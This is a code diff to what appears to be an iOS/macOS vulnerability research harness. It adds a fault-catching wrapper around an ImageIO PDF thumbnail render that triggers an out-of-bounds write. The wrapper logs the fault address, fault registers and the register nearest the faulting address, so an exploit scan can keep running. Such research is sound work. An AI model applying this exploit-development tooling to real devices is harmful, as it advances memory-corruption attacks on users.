@@ -27,6 +27,71 @@
 // context is what reaches the vulnerable code.  A canary brackets each call so
 // a process that never returns leaves the exact file it died on.
 // ===========================================================================
+// ---------------------------------------------------------------------------
+// Fault-tolerant render (the public 112611 PoC's technique, ported): the OOB
+// can fault outright -- unmapped or write-protected target -- and a crash loses
+// the whole run.  So the thumbnail render runs under sigsetjmp/siglongjmp on an
+// alternate signal stack, with the jmp_buf in .bss (the overflow writes through
+// a stack-resident one -- the PoC's own warning) and a nested-fault guard.  On
+// a fault we record sig/far/pc/esr/WnR and the register file, report them, and
+// CONTINUE: the measurement, not the process, is what matters.  A fault that is
+// not ours (another thread, or outside a probe) is handed back to the default
+// disposition so it still produces a crash report.
+// ---------------------------------------------------------------------------
+#include <signal.h>
+#include <setjmp.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <pthread.h>
+
+static sigjmp_buf           g_fault_jb;
+static volatile sig_atomic_t g_in_probe = 0;
+static volatile sig_atomic_t g_in_fault = 0;
+static volatile uint64_t    g_probe_thread = 0;
+static volatile unsigned long g_far = 0, g_esr = 0, g_pc = 0;
+static volatile int           g_sig = 0;
+static volatile unsigned long g_xreg[29];
+
+static void fault_handler(int sig, siginfo_t *si, void *uc) {
+    (void)si;
+    if (g_in_fault) _exit(70);                          // fault inside the handler
+    if (!g_in_probe || (uint64_t)(uintptr_t)pthread_self() != g_probe_thread) {
+        signal(sig, SIG_DFL);                           // not ours: let it crash properly
+        return;
+    }
+    g_in_fault = 1;
+    ucontext_t *u = (ucontext_t *)uc;
+    if (u) {
+        g_far = u->uc_mcontext->__es.__far;
+        g_esr = u->uc_mcontext->__es.__esr;
+        g_pc  = u->uc_mcontext->__ss.__pc;
+        for (int i = 0; i < 29; i++) g_xreg[i] = u->uc_mcontext->__ss.__x[i];
+    }
+    g_sig = sig;
+    g_in_fault = 0;
+    siglongjmp(g_fault_jb, 1);
+}
+
+static void fault_arm(void) {
+    static char *alt = NULL;
+    if (!alt) {
+        alt = mmap(NULL, 256 * 1024, PROT_READ | PROT_WRITE,
+                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (alt != MAP_FAILED) {
+            stack_t ss; ss.ss_sp = alt; ss.ss_size = 256 * 1024; ss.ss_flags = 0;
+            sigaltstack(&ss, NULL);
+        }
+    }
+    struct sigaction sa;
+    memset(&sa, 0, sizeof sa);
+    sa.sa_sigaction = fault_handler;
+    sa.sa_flags = SA_SIGINFO | SA_ONSTACK | SA_NODEFER;
+    sigemptyset(&sa.sa_mask);
+    sigaction(SIGSEGV, &sa, NULL);
+    sigaction(SIGBUS,  &sa, NULL);
+    sigaction(SIGTRAP, &sa, NULL);   // the malloc freelist check traps too
+}
+
 static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
     NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
     if (![[NSFileManager defaultManager] fileExistsAtPath:path])
@@ -48,7 +113,38 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
 
     AvePost([NSString stringWithFormat:@"%@ BEFORE thumbnail of %@ (max %d px)",
              tag, pdfName, maxPx]);
-    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
+    // the write itself, crash-protected: a fault here no longer loses the run
+    CGImageRef img = NULL;
+    g_sig = 0; g_far = 0; g_esr = 0; g_pc = 0;
+    fault_arm();
+    g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
+    if (sigsetjmp(g_fault_jb, 1) == 0) {
+        g_in_probe = 1;
+        img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
+        g_in_probe = 0;
+    } else {
+        g_in_probe = 0;
+        AvePost([NSString stringWithFormat:@"%@ FAULT in render: sig=%d far=%#llx "
+                 @"pc=%#llx esr=%#08llx WnR=%d (esr&0x3f=%#llx) - the write hit a "
+                 @"page it may not touch; run continues", tag, g_sig,
+                 (unsigned long long)g_far, (unsigned long long)g_pc,
+                 (unsigned long long)g_esr, (int)((g_esr >> 6) & 1),
+                 (unsigned long long)(g_esr & 0x3f)]);
+        unsigned long bestd = ~0UL; int besti = -1;
+        for (int i = 0; i < 29; i++) {
+            unsigned long v = g_xreg[i]; if (!v) continue;
+            unsigned long d = (v > g_far) ? (v - g_far) : (g_far - v);
+            if (d < bestd) { bestd = d; besti = i; }
+        }
+        if (besti >= 0)
+            AvePost([NSString stringWithFormat:@"%@ FAULT register x%d = %#llx, "
+                     @"|far - x%d| = %#lx", tag, besti,
+                     (unsigned long long)g_xreg[besti], besti, bestd]);
+        CFRelease(opts);          // ImageIO state may be inconsistent after a fault,
+        CFRelease(src);           // so do not touch anything else of its making
+        return [NSString stringWithFormat:@"%@: FAULT sig=%d far=%#llx (fault caught, "
+                @"carpet scan still runs)", tag, g_sig, (unsigned long long)g_far];
+    }
     CFRelease(opts);
 
     NSString *res;
